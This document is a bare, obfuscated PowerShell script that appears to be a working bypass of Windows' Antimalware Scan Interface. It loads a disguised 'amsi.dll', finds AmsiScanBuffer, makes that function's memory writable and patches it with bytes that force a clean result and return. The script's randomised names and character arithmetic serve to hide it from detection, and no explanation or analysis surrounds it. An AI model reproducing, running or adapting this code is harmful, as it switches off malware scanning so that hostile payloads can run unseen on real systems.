$lVkVMGOsRDY0 = @"
using System;
using System.Runtime.InteropServices;
public class lVkVMGOsRDY0 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr twbqAish, string dhxhcr0DxGyFv);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AIpjf7WXPPusB6Q, UIntPtr XaE8nnXcq33QH, uint T2ltZpLLPu8097lyVqMp, out uint ZYGoj9HutiL7ct1ttIOT);
}
"@

Add-Type $lVkVMGOsRDY0

$obwuDRs = [lVkVMGOsRDY0]::LoadLibrary("$([CHAR](97+8-8)+[CHAR]([bYtE]0x6d)+[chAR](34+81)+[chAR]([BytE]0x69)+[ChAR]([BYtE]0x2e)+[CHaR](8+92)+[chAr]([BYTe]0x6c)+[char](44+64))")
$nmnJ = [lVkVMGOsRDY0]::GetProcAddress($obwuDRs, "$(('ÃmsìSc'+'änBúff'+'èr').NormALIzE([chAR](70)+[CHaR](111*60/60)+[CHAR](114+85-85)+[CHaR]([BYTE]0x6d)+[ChAr](20+48)) -replace [cHar]([ByTE]0x5c)+[CHAr](112*88/88)+[chAr]([byTe]0x7b)+[CHAR](77+18-18)+[Char]([BYTe]0x6e)+[cHAr](125*40/40))")
$p = 0
[lVkVMGOsRDY0]::VirtualProtect($nmnJ, [uint32]5, 0x40, [ref]$p)
$ODQ6qDsYSTg = "0xB8"
$i11sgAUqg = "0x57"
$M4CjGBbdVxzyVM = "0x00"
$rX0bIjGO_9 = "0x07"
$Gsq9og9tn_gcNugMDMb = "0x80"
$eDZ2MIstOJmQj = "0xC3"
$vWAoca = [Byte[]] ($ODQ6qDsYSTg,$i11sgAUqg,$M4CjGBbdVxzyVM,$rX0bIjGO_9,+$Gsq9og9tn_gcNugMDMb,+$eDZ2MIstOJmQj)
[System.Runtime.InteropServices.Marshal]::Copy($vWAoca, 0, $nmnJ, 6)